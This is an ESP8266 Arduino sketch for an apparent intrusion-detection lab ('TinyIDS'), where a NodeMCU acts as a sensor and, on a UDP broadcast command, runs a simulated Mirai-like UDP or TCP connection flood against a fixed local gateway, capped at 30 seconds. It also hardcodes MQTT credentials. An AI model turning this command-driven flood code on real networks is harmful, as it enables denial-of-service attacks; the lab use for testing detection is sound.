// NodeMCU "bot" for the TinyIDS demo (simulated botnet, like Mirai, on our own hardware only).
//
// NORMAL mode : a sensor. Publishes fake temperature/humidity every 2 s to sensors/<NODE_NAME>.
// BOT mode    : on a command from the laptop's bot master (laptop/bot.py) it floods the gateway,
//               then goes back to normal. The command is ONE UDP broadcast packet to port 6667 (BOT_PORT),
//               so the bot needs no laptop IP and the command never goes through the Pi's broker:
//               "udp 10"   UDP packets to the gateway, port 5683, for 10 s
//               "tcp 10"   opens and closes TCP connections to the gateway, port 1884, for 10 s
//               "stop"
//               The bot answers back to the laptop (UDP) and prints everything on the Serial Monitor.
// Safety: the target is ALWAYS the gateway (GATEWAY_IP below, never taken from the command),
//         and an attack stops by itself after at most MAX_ATTACK_SECONDS.
//
// Needs library: PubSubClient (Nick O'Leary). Board: NodeMCU 1.0 (ESP-12E Module). Serial Monitor: 9600 baud.

#include <ESP8266WiFi.h>
#include <WiFiUdp.h>
#include <PubSubClient.h>

// ---------- CHANGE THESE ----------
const char* WIFI_SSID     = "IIITA";
const char* WIFI_PASS     = "";
const char* GATEWAY_IP    = "172.29.2.43";   // the Pi: broker AND the only attack target
const int   MQTT_PORT     = 1884;             // our broker on the Pi
const char* MQTT_USER     = "tinyids";
const char* MQTT_PASS     = "tinyids123";
const char* NODE_NAME     = "node3";
const int   MAX_ATTACK_SECONDS = 30;
const int   BOT_PORT      = 6667;           // the bot master's broadcast commands arrive here
// ----------------------------------

enum Mode { NORMAL, UDP_FLOOD, TCP_FLOOD };

WiFiClient   mqttNet;
PubSubClient mqtt(mqttNet);
WiFiUDP      udp;                // sends the UDP flood
WiFiUDP      commands;           // receives the bot master's commands
IPAddress    master;             // who sent the last command (answers go back there)
uint16_t     masterPort = 0;
WiFiClient   floodConnection;
IPAddress    gateway;

Mode          mode = NORMAL;
unsigned long attackEnds = 0;
unsigned long packetsSent = 0;
unsigned long lastReading = 0;
char          topicData[40];

void reportStatus(const char* text) {
  char msg[120];
  snprintf(msg, sizeof(msg), "{\"node\":\"%s\",\"status\":\"%s\",\"sent\":%lu}", NODE_NAME, text, packetsSent);
  Serial.println(msg);
  if (masterPort != 0) {                   // answer the bot master (not through the Pi's broker)
    commands.beginPacket(master, masterPort);
    commands.write(msg, strlen(msg));
    commands.endPacket();
  }
}

void startAttack(Mode newMode, int seconds) {
  seconds = constrain(seconds, 1, MAX_ATTACK_SECONDS);
  mode = newMode;
  attackEnds = millis() + seconds * 1000UL;
  packetsSent = 0;
  reportStatus(newMode == UDP_FLOOD ? "udp_flood started" : "tcp_flood started");
}

void stopAttack() {
  if (mode == NORMAL) return;
  mode = NORMAL;
  reportStatus("attack stopped, back to normal");
}

// checks if a bot master command arrived on BOT_PORT: "udp 10", "tcp 10" or "stop"
void checkCommand() {
  if (commands.parsePacket() == 0) return;
  char text[32];
  int length = commands.read(text, sizeof(text) - 1);
  if (length <= 0) return;
  text[length] = 0;
  master = commands.remoteIP();
  masterPort = commands.remotePort();
  String cmd = String(text);
  Serial.println("command: " + cmd + " from " + master.toString());

  int seconds = 10;
  int space = cmd.indexOf(' ');
  if (space >= 0) seconds = cmd.substring(space + 1).toInt();

  if (cmd.startsWith("stop"))     { if (mode == NORMAL) reportStatus("already normal"); else stopAttack(); }
  else if (cmd.startsWith("udp")) startAttack(UDP_FLOOD, seconds);
  else if (cmd.startsWith("tcp")) startAttack(TCP_FLOOD, seconds);
}

void connectWiFi() {
  Serial.printf("Wi-Fi '%s'", WIFI_SSID);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) { delay(500); Serial.print("."); }
  Serial.printf("\nWi-Fi OK, my IP: %s\n", WiFi.localIP().toString().c_str());
}

void connectMQTT() {
  while (!mqtt.connected()) {
    String id = String("bot-") + NODE_NAME;
    Serial.printf("MQTT %s:%d ... ", GATEWAY_IP, MQTT_PORT);
    if (mqtt.connect(id.c_str(), MQTT_USER, MQTT_PASS)) {
      Serial.println("OK");
      Serial.println("online, normal sensor");
    } else {
      Serial.printf("failed (state %d), retry in 3 s\n", mqtt.state());
      delay(3000);
    }
  }
}

void sendReading() {
  float t = 25.0 + 1.5 * sin(millis() / 60000.0) + random(-10, 10) / 100.0;
  float h = 55.0 + 5.0 * sin(millis() / 90000.0) + random(-30, 30) / 100.0;
  char msg[120];
  snprintf(msg, sizeof(msg), "{\"node\":\"%s\",\"temp_c\":%.2f,\"humidity\":%.1f,\"uptime_s\":%lu}",
           NODE_NAME, t, h, millis() / 1000);
  mqtt.publish(topicData, msg);
  Serial.println(msg);
}

void attackBurst() {                       // a short burst, then back to loop() so MQTT keeps working
  for (int i = 0; i < 20; i++) {
    if (mode == UDP_FLOOD) {
      udp.beginPacket(gateway, 5683);
      udp.write("TINYIDS!", 8);
      udp.endPacket();
    } else {
      floodConnection.connect(gateway, MQTT_PORT);
      floodConnection.stop();
    }
    packetsSent++;
    yield();
  }
}

void setup() {
  Serial.begin(9600);
  delay(300);
  gateway.fromString(GATEWAY_IP);
  snprintf(topicData, sizeof(topicData), "sensors/%s", NODE_NAME);
  connectWiFi();
  mqtt.setServer(GATEWAY_IP, MQTT_PORT);
  connectMQTT();
  commands.begin(BOT_PORT);                // listen for the bot master's broadcast
}

void loop() {
  if (WiFi.status() != WL_CONNECTED) connectWiFi();
  if (!mqtt.connected()) connectMQTT();
  mqtt.loop();
  checkCommand();

  if (mode == NORMAL) {
    if (millis() - lastReading >= 2000) { lastReading = millis(); sendReading(); }
  } else {
    attackBurst();
    if ((long)(millis() - attackEnds) >= 0) stopAttack();
  }
}
